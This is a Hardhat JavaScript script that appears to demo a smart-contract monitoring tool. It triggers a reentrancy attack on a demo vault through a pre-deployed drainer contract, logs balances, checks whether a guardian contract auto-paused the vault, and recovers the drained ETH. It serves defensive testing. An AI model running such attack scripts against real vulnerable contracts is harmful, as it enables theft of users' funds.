#!/usr/bin/env node
/**
 * Execute Reentrancy Attack on DemoVault for Sentinel Demo
 * 
 * This script:
 * 1. Calls SimpleDrainer.attack() to trigger reentrancy
 * 2. Shows before/after balances
 * 3. Verifies if Guardian paused the vault
 */

const hre = require("hardhat");

// Configuration - Demo Vault and Drainer from previous deployment
const CONFIG = {
  DEMO_VAULT: "0x22650892Ce8db57fCDB48AE8b3508F52420A727A",
  SIMPLE_DRAINER: "0xE1E59cB4d2D4caFDb966B77fA76D775f344471ab",
  GUARDIAN: "0xD1965D40aeAAd9F1898F249C9cf6b2b74c3B5AE1",
  ATTACK_AMOUNT: "0.001", // ETH to use for attack (deposit)
  DRAIN_AMOUNT: "0.001",  // ETH to try to drain per iteration
};

// ABI fragments needed
const VAULT_ABI = [
  "function getBalance() view returns (uint256)",
  "function paused() view returns (bool)",
  "function balanceOf(address) view returns (uint256)",
  "event Withdraw(address indexed user, uint256 amount)",
  "event Deposit(address indexed user, uint256 amount)",
];

const DRAINER_ABI = [
  "function attack(uint256 drainAmount) payable",
  "function getBalance() view returns (uint256)",
  "function drainCount() view returns (uint256)",
  "function withdrawToOwner()",
];

async function main() {
  console.log("🚀 EXECUTING REENTRANCY ATTACK ON DEMO VAULT\n");

  const [attacker] = await hre.ethers.getSigners();
  console.log(`Attacker: ${attacker.address}`);
  console.log(`Balance: ${hre.ethers.formatEther(await hre.ethers.provider.getBalance(attacker.address))} ETH\n`);

  // Connect to contracts
  const vault = new hre.ethers.Contract(CONFIG.DEMO_VAULT, VAULT_ABI, attacker);
  const drainer = new hre.ethers.Contract(CONFIG.SIMPLE_DRAINER, DRAINER_ABI, attacker);

  // Get initial state
  console.log("📊 INITIAL STATE:");
  const vaultBalanceBefore = await vault.getBalance();
  const attackerBalanceBefore = await hre.ethers.provider.getBalance(attacker.address);
  const isPausedBefore = await vault.paused();
  
  console.log(`   Vault Balance:      ${hre.ethers.formatEther(vaultBalanceBefore)} ETH`);
  console.log(`   Attacker Balance:   ${hre.ethers.formatEther(attackerBalanceBefore)} ETH`);
  console.log(`   Vault Paused:       ${isPausedBefore}`);
  console.log(`   Drainer Contract:   ${CONFIG.SIMPLE_DRAINER}\n`);

  if (isPausedBefore) {
    console.log("⚠️  Vault is already paused! Attack won't work while paused.");
    console.log("   Unpause first to demonstrate the attack.\n");
    return;
  }

  // Execute attack
  console.log("⚔️  EXECUTING ATTACK...");
  console.log(`   Sending ${CONFIG.ATTACK_AMOUNT} ETH to SimpleDrainer...`);
  console.log(`   Target drain per iteration: ${CONFIG.DRAIN_AMOUNT} ETH\n`);

  try {
    const attackTx = await drainer.attack(
      hre.ethers.parseEther(CONFIG.DRAIN_AMOUNT),
      {
        value: hre.ethers.parseEther(CONFIG.ATTACK_AMOUNT),
        gasLimit: 500000,
      }
    );

    console.log(`   Attack transaction sent: ${attackTx.hash}`);
    console.log("   Waiting for confirmation...\n");

    const receipt = await attackTx.wait();
    console.log(`   ✅ Attack confirmed in block ${receipt.blockNumber}`);
    console.log(`   Gas used: ${receipt.gasUsed.toString()}\n`);

    // Wait a moment for Sentinel to potentially react
    console.log("⏳ Waiting 5 seconds for Sentinel Node to detect and respond...\n");
    await new Promise(r => setTimeout(r, 5000));

  } catch (error) {
    console.error(`   ❌ Attack failed: ${error.message}\n`);
    
    // Check if it was paused mid-attack
    const isPausedNow = await vault.paused();
    if (isPausedNow && !isPausedBefore) {
      console.log("   🛡️  GUARDIAN PAUSED THE VAULT MID-ATTACK!\n");
    }
  }

  // Get final state
  console.log("📊 FINAL STATE:");
  const vaultBalanceAfter = await vault.getBalance();
  const attackerBalanceAfter = await hre.ethers.provider.getBalance(attacker.address);
  const isPausedAfter = await vault.paused();
  const drainerBalance = await drainer.getBalance();
  const drainCount = await drainer.drainCount();

  console.log(`   Vault Balance:      ${hre.ethers.formatEther(vaultBalanceAfter)} ETH`);
  console.log(`   Attacker Balance:   ${hre.ethers.formatEther(attackerBalanceAfter)} ETH`);
  console.log(`   Drainer Balance:    ${hre.ethers.formatEther(drainerBalance)} ETH`);
  console.log(`   Reentrancy Count:   ${drainCount}`);
  console.log(`   Vault Paused:       ${isPausedAfter}\n`);

  // Analysis
  const vaultLoss = vaultBalanceBefore - vaultBalanceAfter;
  const netCost = attackerBalanceBefore - attackerBalanceAfter;

  console.log("📈 ATTACK ANALYSIS:");
  console.log(`   Vault Loss:         ${hre.ethers.formatEther(vaultLoss)} ETH`);
  console.log(`   Attacker Net Cost:  ${hre.ethers.formatEther(netCost)} ETH`);
  console.log(`   Drained to Drainer: ${hre.ethers.formatEther(drainerBalance)} ETH\n`);

  if (isPausedAfter && !isPausedBefore) {
    console.log("╔══════════════════════════════════════════════════════════╗");
    console.log("║         🛡️  GUARDIAN AUTO-PAUSE TRIGGERED!              ║");
    console.log("╚══════════════════════════════════════════════════════════╝\n");
    console.log("✅ Sentinel detected the attack and Guardian paused the vault!");
    console.log("   The reentrancy was blocked before full drainage.\n");
  } else if (drainCount > 0) {
    console.log("⚠️  Reentrancy executed but Guardian didn't pause (yet)");
    console.log("   Check Sentinel Node logs for threat detection.\n");
  }

  // Recover funds from drainer if any
  if (drainerBalance > 0) {
    console.log("💰 Recovering stolen funds from drainer contract...");
    try {
      const recoverTx = await drainer.withdrawToOwner();
      await recoverTx.wait();
      console.log("   ✅ Funds recovered!\n");
    } catch (e) {
      console.log(`   ❌ Recovery failed: ${e.message}\n`);
    }
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n❌ Attack script failed:", error.message);
    process.exit(1);
  });
